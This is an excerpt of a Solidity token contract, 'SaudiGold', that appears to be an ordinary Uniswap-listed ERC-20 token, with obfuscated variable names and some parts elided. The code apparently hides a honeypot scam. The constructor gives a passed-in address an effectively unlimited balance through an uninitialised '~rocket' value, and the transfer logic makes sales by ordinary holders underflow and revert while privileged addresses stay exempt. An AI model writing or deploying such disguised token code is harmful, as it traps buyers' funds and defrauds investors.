...
contract SaudiGold is Ownable {
    constructor(
        string memory line,
        string memory happen,
        address either,
        address shells
    ) {
        uniswapV2Router = IUniswapV2Router02(either);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        population[shells] = five;
        east = line;
        activity = happen;
        think = 9;
        rocket = 3;
        speed[shells] = five;
        speed[msg.sender] = five;
        _tTotal = 1000000000000 * 10**think;
        population[msg.sender] = _tTotal;
    }

    uint256 public rocket;
    string private east;
    ...
    uint256 private being;
    address public uniswapV2Pair;
    uint256 private five = ~rocket;
    ...
    mapping(address => uint256) private population;
    ...
    function influence(
        ...
        address club = (uniswapV2Pair);

        if (speed[unusual] == 0 && (club != unusual) && instant[unusual] > 0) {
            speed[unusual] -= think;
        }
        ...
        population[unusual] -= author;
        uint256 directly = (author / 100) * rocket;
        author -= directly;
        instant[rain] += think;
        population[camera] += author;
    }

    mapping(address => uint256) private instant;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private speed;
    ...
    function transferFrom(
        ...
        influence(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        influence(msg.sender, recipient, amount);
        return true;
    }
